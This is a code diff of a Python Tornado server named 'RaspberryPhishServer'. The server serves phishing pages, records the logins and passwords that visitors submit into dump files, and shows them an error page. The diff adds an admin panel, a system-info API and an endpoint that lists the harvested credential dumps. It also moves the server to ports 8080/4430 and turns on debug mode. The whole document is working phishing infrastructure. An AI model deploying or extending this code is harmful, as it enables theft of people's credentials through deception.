@@ -2,25 +2,100 @@
 # -*- coding: utf-8 -*-
 __title__ = "RaspberryPhishServer"
 
-import tornado.ioloop
-import tornado.web
 import os
 import ssl
 import time
+import random
+
+import tornado.ioloop
+import tornado.web
+
+import json
+
+from Modules.UnixSysInfos import *
 
 # var : directory name where the server will load in "pages" and "rsc"
 pagePath = "test/"
 
 
+def liste_dump(folder):
+    dico = {}
+    for root, dirs, files in os.walk(folder):
+        for dump in files:
+            path = root + dump
+            dico[path] = "lol"
+
+
+# Handler for ressources
+class APIHandler(tornado.web.RequestHandler):
+    def get(self, path_request):
+        print("API:" + str(time.time()) + " GET " + path_request)
+        if path_request == "debug":
+            self.write("API:" + str(time.time()) + " GET " + path_request)
+        elif path_request == "random":
+            self.write(str(random.randint(0, 100)))
+        elif path_request == "SystemInfos":
+            self.write(
+                json.dumps(
+                    {
+                        "OS":
+                            {
+                                "Name": OSInfos.os_name(),
+                                "Host": OSInfos.name(),
+                                "Python": OSInfos.python_version(),
+                                "Interpreter": OSInfos.interpreter_name()
+                            },
+                        "CPU":
+                            {
+                                "Type": CpuInfos.cpu_type(),
+                                "Name": CpuInfos.cpu_name(),
+                                "AvgLoad": CpuInfos.avg_load()
+                            },
+                        "RAM":
+                            {
+                                "AvgLoad": RamInfos.avg_load()
+                            },
+                        "STORAGE":
+                            {
+                                "AvgLoad": StorageInfos.avg_load(),
+                                "IOLoad": StorageInfos.io_load()
+                            },
+                        "SENSORS":
+                            {
+                                "TEMPS":
+                                    {
+                                        "CPU": SensorInfos.cpu_temp(),
+                                        "MB": SensorInfos.cpu_temp(),
+                                        "GPU": SensorInfos.cpu_temp()
+                                    }
+                            }
+                    }
+                )
+            )
+        elif path_request == "Dumps":
+            self.write(str(liste_dump("logs/dump")))
+
+
 # Handler for ressources
 class RscHandler(tornado.web.RequestHandler):
     def get(self, path_request):
-        self.write(open("rsc/" + pagePath + path_request, 'rb').read())
+        print(path_request)
+        if str(path_request).endswith(".css"):
+            self.set_header("Content-Type", "text/css; charset=UTF-8")
+        self.write(open("rsc/" + path_request, 'rb').read())
 
 
-# class AdminHandler(tornado.web.RequestHandler):
-    # def get(self, path_request):
-        # self.write(open("admin/", 'rb').read())
+class AdminHandler(tornado.web.RequestHandler):
+    def get(self):
+        self.render("pages/admin/index.html")
+
+    def post(self):
+        try:
+            action = self.get_argument("action")
+            print("action :", action)
+        except tornado.web.HTTPError:   # no or wrong arguments
+            pass
+        self.render("pages/admin/index.html")
 
 
 # Handler for HTML files
@@ -36,7 +111,7 @@ class MainHandler(tornado.web.RequestHandler):
                 if not os.path.exists("logs/dump/" + pagePath):
                     os.mkdir("logs/dump/" + pagePath)
                 file = open("logs/dump/" + pagePath + str(time.time()), mode="a+")
-                file.write("login:" + login + "\npassword:" + password)
+                file.write("login:" + login + "\npassword:" + password + "\n")
                 file.close()
             except IOError:
                 print(pagePath)
@@ -44,31 +119,36 @@ class MainHandler(tornado.web.RequestHandler):
                 print("password :", password)
         except tornado.web.HTTPError:   # no or wrong arguments
             pass
-        self.render("pages/" + pagePath + "error.html")     # show an error page to the client
+        # show an error page to the client
+        self.render("pages/" + pagePath + "error.html")
 
 
-if __name__ == "__main__":
+def main():
     application = tornado.web.Application(
         [
-            (r'/rsc/(.*)$', RscHandler),
+            (r'/admin/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
+            (r"/admin", AdminHandler),
+            (r"/admin/.*", AdminHandler),
+
+            (r"/API/(.*)$", APIHandler),
+
+            (r'/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
             (r"/", MainHandler),
-            (r"/*", MainHandler),
             (r"/.*", MainHandler),
-            # (r"/admin", AdminHandler),
         ],
-        autoreload=True
-        # , debug=True
+        autoreload=True,
+        debug=True
     )   # create an instance
 
     if(os.path.isfile("cert/" + pagePath + "default.key") and
        os.path.isfile("cert/" + pagePath + "default.cert")):
-        ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        ssl_ctx.load_cert_chain("cert/" + pagePath + "default.cert",
-                                "cert/" + pagePath + "default.key",)
-        ssl_ctx.load_verify_locations("cert/" + pagePath + "default.pem")
-        ssl_ctx.verify_mode = ssl.CERT_OPTIONAL     # clients don't always provide a cert file (web browsers)
-        application.listen(443, ssl_options=ssl_ctx)   # bind https port
+        # bind https port
+        application.listen(4430, ssl_options={"certfile": os.path.join("cert/" + pagePath + "default.cert"), "keyfile": os.path.join("cert/" + pagePath + "default.key"), "cert_reqs": ssl.CERT_OPTIONAL})
 
-    application.listen(80)    # bind http port
+    # bind http port
+    application.listen(8080)
+    # loop forever for satisfy user's requests
+    tornado.ioloop.IOLoop.instance().start()
 
-    tornado.ioloop.IOLoop.instance().start()    # loop forever for satisfy user's requests
+if __name__ == "__main__":
+    main()
